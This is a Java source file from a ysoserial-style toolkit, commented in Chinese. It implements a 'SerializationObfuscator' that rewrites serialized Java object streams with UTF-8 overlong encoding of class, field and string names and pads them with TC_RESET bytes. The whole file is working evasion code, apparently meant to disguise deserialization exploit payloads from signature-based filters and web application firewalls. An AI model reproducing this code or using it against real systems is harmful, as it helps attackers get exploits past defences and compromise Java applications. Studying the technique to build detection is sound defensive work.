package ysoserial;

import java.io.ByteArrayOutputStream;

import static java.io.ObjectStreamConstants.TC_RESET;

/**
 * @author Whoopsunix
 * <p>
 * UTF-8 混淆
 */
public class SerializationObfuscator {
    private ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    public byte[] originalBytes = new byte[0];
    public int tcResetSize = 0;

    boolean resetFlag = false;

    // 加密字节位数
    // 1: 随机调用 2、3 字节
    // 2: 纯2字节
    // 3: 纯3字节
    public int type = 0;

    // 原 byte[] 坐标
    public int index = 0;

    private final static byte TC_CLASSDESC = (byte) 0x72;
    private final static byte TC_PROXYCLASSDESC = (byte) 0x7d;
    private final static byte TC_STRING = (byte) 0x74;
    private final static byte TC_REFERENCE = (byte) 0x71;
    private final static byte TC_LONGSTRING = (byte) 0x7C;
    private final static byte TC_ARRAY = (byte) 0x75;
    private final static byte TC_ENDBLOCKDATA = (byte) 0x78;
    private final static byte TC_NULL = (byte) 0x70;


    private final static byte Byte = (byte) 0x42;
    private final static byte Char = (byte) 0x43;
    private final static byte Double = (byte) 0x44;
    private final static byte Float = (byte) 0x46;
    private final static byte Integer = (byte) 0x49;
    private final static byte Long = (byte) 0x4a;
    private final static byte Object_L = (byte) 0x4c;
    private final static byte Short = (byte) 0x53;
    private final static byte Boolean = (byte) 0x5a;
    private final static byte Array = (byte) 0x5b;


    public static SerializationObfuscator builder(byte[] originalBytes) {
        return new SerializationObfuscator(originalBytes);
    }

    public SerializationObfuscator(byte[] originalBytes) {
        this.originalBytes = originalBytes;
    }

    public SerializationObfuscator withType(int type) {
        this.type = type;
        return this;
    }

    public SerializationObfuscator withTcResetSize(int tcResetSize) {
        this.tcResetSize = tcResetSize;
        return this;
    }

    public byte[] build() {

        while (index < originalBytes.length) {
            byte b = originalBytes[index];
            outputStream.write(b);

            // ac ed 00 05 后面加 TC_RESET
            if (index == 3) {
                handleReset();
            }

            // UTF8 Overlong Encoding
            if (type > 0) {
                if (b == TC_CLASSDESC) {
                    changeTC_CLASSDESC();
                } else if (b == TC_PROXYCLASSDESC) {
                    changeTC_PROXYCLASSDESC();
                } else if (b == TC_STRING) {
                    changeTC_STRING();
                }
            }

            index++;
        }
        return outputStream.toByteArray();
    }

    public void handleReset() {

        // TC_RESET
        if (!resetFlag && tcResetSize > 0) {
            for (int i = 0; i < tcResetSize; i++) {
                outputStream.write(TC_RESET);
            }
            resetFlag = true;
        }

    }

    public void changeTC_PROXYCLASSDESC() {
        int interfaceCount = ((originalBytes[index + 1] & 0xFF) << 24) |
                ((originalBytes[index + 2] & 0xFF) << 16) |
                ((originalBytes[index + 3] & 0xFF) << 8) |
                (originalBytes[index + 4] & 0xFF);
        if (interfaceCount > 0xff || interfaceCount < 0x00)
            return;

        for (int i = 0; i < 4; i++) {
            outputStream.write(originalBytes[index + 1]);
            index++;
        }

        int length = ((originalBytes[index + 1] & 0xFF) << 8) | (originalBytes[index + 2] & 0xFF);
        byte[] originalValue = new byte[length];
        System.arraycopy(originalBytes, index + 3, originalValue, 0, length);
        index += 3 + length;

        encode(originalValue, type);
        index--;
    }


    public boolean changeTC_CLASSDESC() {
        /**
         * 类信息
         */
        boolean isTC_CLASSDESC = changeTC_STRING();
        if (!isTC_CLASSDESC) {
            return false;
        }
        index++;

        /**
         * SerialVersionUID + ClassDescFlags
         */
        byte[] serialVersionUID = new byte[9];
        System.arraycopy(originalBytes, index, serialVersionUID, 0, 9);
        for (int i = 0; i < serialVersionUID.length; i++) {
            outputStream.write(serialVersionUID[i]);
        }
        index += 9;

        /**
         * FieldCount
         */
        byte[] fieldCount = new byte[2];
        System.arraycopy(originalBytes, index, fieldCount, 0, 2);
        for (int i = 0; i < fieldCount.length; i++) {
            outputStream.write(fieldCount[i]);
        }
        int fieldCounts = ((fieldCount[0] & 0xFF) << 8) | (fieldCount[1] & 0xFF);
        index += 2;

        for (int i = 0; i < fieldCounts; i++) {
            boolean isFiledOver = false;

            /**
             * FieldName
             */
            if (originalBytes[index] == Byte
                    || originalBytes[index] == Char
                    || originalBytes[index] == Double
                    || originalBytes[index] == Float
                    || originalBytes[index] == Integer
                    || originalBytes[index] == Long
                    || originalBytes[index] == Object_L
                    || originalBytes[index] == Short
                    || originalBytes[index] == Boolean
                    || originalBytes[index] == Array) {
                // Object
                outputStream.write(originalBytes[index]);
                index++;

                int fieldLength = ((originalBytes[index] & 0xFF) << 8) | (originalBytes[index + 1] & 0xFF);
                byte[] originalFieldName = new byte[fieldLength];
                System.arraycopy(originalBytes, index + 2, originalFieldName, 0, fieldLength);
                index += 2 + fieldLength;
                encode(originalFieldName, type);
            }

            /**
             * Class Name
             *
             * 也规避了这种情况
             *          Index 0:
             *           Integer - I - 0x49
             *           @FieldName
             *             @Length - 4 - 0x00 04
             *             @Value - size - 0x73 69 7a 65
             */
            // TC_STRING 0x74
            if (originalBytes[index] == TC_STRING) {

                outputStream.write(originalBytes[index]);
                index++;

                int classLength = ((originalBytes[index] & 0xFF) << 8) | (originalBytes[index + 1] & 0xFF);
                byte[] originalClassName = new byte[classLength];
                System.arraycopy(originalBytes, index + 2, originalClassName, 0, classLength);
                index += 2 + classLength;
                encode(originalClassName, type);
                isFiledOver = true;
            } else if (originalBytes[index] == TC_REFERENCE) {
                /**
                 * Index 0:
                 * Object - L - 0x4c
                 * @FieldName
                 * @Length - 9 - 0x00 09
                 * @Value - decorated - 0x64 65 63 6f 72 61 74 65 64
                 * @ClassName
                 *         TC_REFERENCE - 0x71
                 * @Handler - 8257537 - 0x00 7e 00 01
                 */
                byte[] reference = new byte[5];
                System.arraycopy(originalBytes, index, reference, 0, 5);
                for (int j = 0; j < reference.length; j++) {
                    outputStream.write(reference[j]);
                }
                index += 5;
                isFiledOver = true;
            }

            // todo 看看其他可能未识别到的类型
//            if(i < fieldCounts - 1 && !isFiledOver) {
//                while (true) {
//                    if (!isField(originalBytes, index)) {
//                        byteAdd(originalBytes[index]);
//                        index++;
//                    } else {
//                        break;
//                    }
//                }
//            }

        }

        // 循环需要
        index--;
        return true;
    }

    public boolean changeTC_STRING() {
        int length = ((originalBytes[index + 1] & 0xFF) << 8) | (originalBytes[index + 2] & 0xFF);
        // 溢出
        if (length > 0xff || length < 0x00)
            return false;

        // 原始内容
        byte[] originalValue = new byte[length];
        System.arraycopy(originalBytes, index + 3, originalValue, 0, length);
        // 非全部可见字符，可能存在的报错，不继续执行
        if (!isByteVisible(originalValue)) {
            return false;
        }

        index += 3 + length;
        encode(originalValue, type);

        index--;
        return true;
    }


    public boolean isField(byte[] checkBytes, int index) {
        if (!(checkBytes[index] == Byte
                || checkBytes[index] == Char
                || checkBytes[index] == Double
                || checkBytes[index] == Float
                || checkBytes[index] == Integer
                || checkBytes[index] == Long
                || checkBytes[index] == Object_L
                || checkBytes[index] == Short
                || checkBytes[index] == Boolean
                || checkBytes[index] == Array)) {
            return false;
        }

        int length = ((checkBytes[index + 1] & 0xFF) << 8) | (checkBytes[index + 2] & 0xFF);
        if (length > 0xff || length < 0x00)
            return false;
        byte[] lengthBytes = new byte[length];
        try {
            System.arraycopy(checkBytes, index + 3, lengthBytes, 0, length);
        } catch (Exception e) {
            return false;
        }

        return true;
    }

    /**
     * UTF8-Overlong-Encoding 处理
     *
     * @return
     */
    public void encode(byte[] originalValue, int type) {
        if (type == 3) {
            // 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx
            int newLength = originalValue.length * 3;

            outputStream.write((byte) ((newLength >> 8) & 0xFF));
            outputStream.write((byte) (newLength & 0xFF));

            for (int i = 0; i < originalValue.length; i++) {
                char c = (char) originalValue[i];
                outputStream.write((byte) (0xE0 | ((c >> 12) & 0x0F)));
                outputStream.write((byte) (0x80 | ((c >> 6) & 0x3F)));
                outputStream.write((byte) (0x80 | ((c >> 0) & 0x3F)));
            }

        } else if (type == 2) {
            // 2 byte format: 110xxxxx 10xxxxxx
            int newLength = originalValue.length * 2;

            outputStream.write((byte) ((newLength >> 8) & 0xFF));
            outputStream.write((byte) (newLength & 0xFF));

            for (int i = 0; i < originalValue.length; i++) {
                char c = (char) originalValue[i];
                outputStream.write((byte) (0xC0 | ((c >> 6) & 0x1F)));
                outputStream.write((byte) (0x80 | ((c >> 0) & 0x3F)));
            }
        } else if (type == 1) {
            // 随机调用2、3
            int threeByteCount = originalValue.length / 2 + 1; // 3 字节混淆的数量
            int twoByteCount = originalValue.length - threeByteCount; // 2 字节混淆的数量
            int newLength = threeByteCount * 3 + twoByteCount * 2;

            outputStream.write((byte) ((newLength >> 8) & 0xFF));
            outputStream.write((byte) (newLength & 0xFF));

            int count = 0;
            for (int i = 0; i < originalValue.length; i++) {
                char s = (char) originalValue[i];
                if (randomCall(originalValue.length - count, threeByteCount)) {
                    outputStream.write((byte) (0xe0 + (convert3(s)[0] & 0xf)));
                    outputStream.write((byte) (0x80 + (convert3(s)[1] & 0x3f)));
                    outputStream.write((byte) (0x80 + (convert3(s)[2] & 0x3f)));
                    threeByteCount--;
                } else {
                    outputStream.write((byte) (0xc0 + (convert2(s)[0] & 0x1f)));
                    outputStream.write((byte) (0x80 + (convert2(s)[1] & 0x3f)));
                }
                count++;
            }

        }


    }

    // 计算3字节的调用概率
    public boolean randomCall(int remainingPositions, int remainingCalls) {
        long seed = System.currentTimeMillis();
        java.util.Random rand = new java.util.Random(seed);
        double probability = (double) remainingCalls / remainingPositions;
        double randomProbability = rand.nextDouble();
        return randomProbability < probability;
    }

    public int[] convert2(int i) {
        int b1 = ((i >> 6) & 0b11111) | 0b11000000;
        int b2 = (i & 0b111111) | 0b10000000;
        return new int[]{b1, b2};
    }

    public int[] convert3(int i) {
        int b1 = ((i >> 12) & 0b1111) | 0b11100000;
        int b2 = ((i >> 6) & 0b111111) | 0b10000000;
        int b3 = (i & 0b111111) | 0b10000000;
        return new int[]{b1, b2, b3};
    }

    /**
     * 判断字节是否在可见字符的 ASCII 范围内
     *
     * @param bytes
     * @return
     */
    public boolean isByteVisible(byte[] bytes) {
        for (byte b : bytes) {
            if (b < 32 || b > 126) {
                return false;
            }
        }
        return true;
    }

}
